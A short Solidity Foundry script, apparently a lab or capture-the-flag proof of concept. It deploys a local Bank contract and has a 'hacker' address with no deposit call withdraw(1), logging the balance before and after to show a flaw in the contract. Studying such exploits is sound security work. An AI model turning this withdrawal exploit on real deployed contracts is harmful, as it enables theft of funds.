// SPDX-License-Identifier: MIT
pragma solidity >= 0.6.0 < 0.9.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/Bank.sol";

contract POC is Script {
    Bank public target;
    address public hacker;

    function setUp() external {
        hacker = vm.addr(0x12345678);
        target = new Bank();
        vm.deal(hacker, 1 ether);
        vm.deal(address(target), 1 ether);
    }

    function run() external {
        vm.startPrank(hacker);
        
        uint256 balance = target.balanceOf(hacker);
        console.log("before balance: ", balance);

        target.withdraw(1);

        balance = target.balanceOf(hacker);
        console.log("after balance: ", balance);
    }
}